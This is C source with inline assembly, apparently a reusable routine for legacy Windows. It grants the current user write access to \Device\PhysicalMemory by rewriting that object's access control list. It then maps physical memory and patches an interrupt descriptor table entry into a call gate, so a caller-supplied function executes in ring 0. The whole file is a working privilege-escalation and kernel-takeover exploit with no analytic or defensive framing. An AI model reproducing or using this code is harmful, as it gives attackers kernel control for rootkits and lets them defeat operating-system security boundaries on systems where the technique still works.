#include <aclapi.h>

#pragma comment(linker,"/MERGE:.rdata=.text") 
#pragma comment(linker,"/SECTION:.text,EWRX") 
#pragma comment(linker,"/ENTRY:WinMain")   
#pragma comment(linker,"/SUBSYSTEM:WINDOWS") 

#define INTNUMBER 0FFh
#define SE_KERNEL_OBJECT 6
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define OBJ_KERNEL_HANDLE    0x00000200L

#define INIT_UNICODE(_var,_buffer)            \
        UNICODE_STRING _var = {               \
            sizeof (_buffer) - sizeof (WORD), \
            sizeof (_buffer),                 \
            _buffer }

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
    }

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef (__stdcall *_NtOpenSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes);

void callring0(LPVOID ring0proc,
			   _NtOpenSection NtOpenSection,
			   LPVOID HGetSecurityInfo,
			   LPVOID HSetEntriesInAclA,
			   LPVOID HSetSecurityInfo,
			   LPVOID HCloseHandle,
			   LPVOID HUnmapViewOfFile,
			   LPVOID HMapViewOfFile)
{
	OBJECT_ATTRIBUTES ObAttributes;
	EXPLICIT_ACCESS Access;
	HANDLE hSection;
	DWORD res;
	LPVOID pbMap;
	PACL OldDacl=NULL, NewDacl=NULL;
	PSECURITY_DESCRIPTOR SecDesc=NULL;
	INIT_UNICODE(ObString, L"\\Device\\PhysicalMemory");
	InitializeObjectAttributes(&ObAttributes,&ObString,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);

	Access.grfAccessPermissions = SECTION_MAP_WRITE; // :P
	Access.grfAccessMode        = GRANT_ACCESS;
	Access.grfInheritance       = NO_INHERITANCE;
	Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
	Access.Trustee.pMultipleTrustee = NULL;
	Access.Trustee.TrusteeForm  = TRUSTEE_IS_NAME;
	Access.Trustee.TrusteeType  = TRUSTEE_IS_USER;
	Access.Trustee.ptstrName = "CURRENT_USER";

	res = NtOpenSection(&hSection,SECTION_MAP_READ|SECTION_MAP_WRITE,&ObAttributes);
	if (res == -1) goto hook_interrupt;
	res = NtOpenSection(&hSection,MEM_MAPPED|MEM_PRIVATE,&ObAttributes);
	res = GetSecurityInfo(hSection,(SE_OBJECT_TYPE)SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,0,0,&OldDacl,0,&SecDesc);
   	res = SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);
	res = SetSecurityInfo(hSection, (SE_OBJECT_TYPE)SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,NewDacl,NULL);
	CloseHandle(hSection);
	res = NtOpenSection(&hSection,SECTION_MAP_READ|SECTION_MAP_WRITE,&ObAttributes);
	__asm {
hook_interrupt:
        push    eax
        sidt    fword ptr [esp - 2]
        pop     esi
        btr     esi, 1fh
        push    1
        push    esi
        push    0
        push    SECTION_MAP_WRITE
        push    [hSection]
        call    HMapViewOfFile
        mov		[pbMap], eax
        and     esi, 0fffh
        lea     esi, dword ptr [eax + esi + INTNUMBER * 8]
        fild    qword ptr [esi]
        call    skip_ring0

        ;begin ring 0
		
		call	ring0proc
        iretd

        ;end ring 0

skip_ring0:
        pop     word ptr [esi]
        mov     byte ptr [esi + 2], 8
        mov     byte ptr [esi + 5], 0eeh
        pop     word ptr [esi + 6]
        int     INTNUMBER
	}
	UnmapViewOfFile(pbMap);
	CloseHandle(hSection);
}

void R0(LPVOID fn)
{
	LPVOID NtOpenSection = GetProcAddress(GetModuleHandle("ntdll"),"NtOpenSection");
	callring0(fn,
		(_NtOpenSection)NtOpenSection,
		&GetSecurityInfo,
		&SetEntriesInAclA, 
		&SetSecurityInfo,
		&CloseHandle,
		&UnmapViewOfFile,
		&MapViewOfFile);
}